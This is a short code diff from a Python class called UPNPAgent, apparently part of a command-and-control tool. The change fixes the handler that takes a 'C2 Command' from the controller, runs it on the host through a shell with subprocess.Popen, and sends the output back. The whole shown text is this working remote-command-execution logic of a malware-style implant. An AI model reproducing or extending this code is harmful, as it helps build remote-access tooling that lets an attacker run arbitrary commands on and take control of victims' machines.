@@ -118,7 +118,7 @@ class UPNPAgent:
             if command == ord('c'):
                 print("\nReceived C2 Command ", message_content.decode('utf8'))
                 command_str = message_content.decode('utf8')
-                process = subprocess.Popen(command_args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout, stderr = process.communicate()
                 self.queue_message(agent_ip, b'm', (stdout + "\n" + stderr + "\n").encode('utf8'))
             elif command == ord('m'):
